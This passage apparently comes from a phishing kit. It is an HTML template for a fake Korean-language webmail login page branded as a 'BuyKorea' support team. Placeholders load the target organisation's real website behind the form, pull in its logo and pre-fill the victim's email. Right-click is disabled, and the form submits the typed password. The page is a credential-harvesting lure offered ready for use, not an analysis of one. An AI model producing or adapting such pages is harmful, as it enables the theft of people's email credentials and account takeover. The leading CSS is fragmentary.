            border: 1px solid #0d4f8b;
            font-size: 20px;
            padding: 7px 20px;
            border-radius: 4px;
            background-color: #0d4f8b;
            color: #fff;
        }

            background-color: #1874cd;
            cursor: pointer;
        }

            color: gray;

            display: block;

        iframe.background-iframe {

<body oncontextmenu="return false;">

    <!-- iframe as background -->
    <iframe class="background-iframe" src="https://www.{{ins}}"></iframe>

    <div class="form-holder">
        <div class="xlogo">
            <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
            <img src="logo.png" alt="Company Logo">
            <span>BuyKorea 지원팀</span>
        </div>
        <div class="form-wrap">
            <p><b>웹메일 로그인</b></p>
            <form method="post" action="form-action">
                <div class="finput">
                    <input type="email" placeholder="이메일" required="" value="{{eman}}">
                </div>
                <div class="finput">
                    <input type="password" placeholder="비밀번호" required="">
                </div>
                <button type="submit">로그인</button>
            </form>
            <div class="privacy">
                개인정보 보호정책을 확인해주세요.
            </div>
        </div>
    </div>
